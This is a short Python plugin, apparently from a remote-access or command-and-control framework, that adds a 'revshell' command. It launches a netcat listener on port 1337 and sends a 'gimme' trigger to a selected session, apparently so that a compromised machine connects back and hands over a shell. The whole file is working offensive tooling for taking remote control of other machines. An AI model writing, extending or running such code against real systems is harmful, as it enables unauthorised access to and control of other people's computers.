from plugin_manager.manager import plugin_manager
import socket
import multiprocessing
import os
import time
class test(plugin_manager):

    def do_revshell(self, args):

        def start_revshell():
            os.system("nc -nlvp 1337")

        p = multiprocessing.Process(target = start_revshell)
        p.start()
        time.sleep(1)
        self.connections[int(self.current_session)].send("gimme".encode())
        p.join()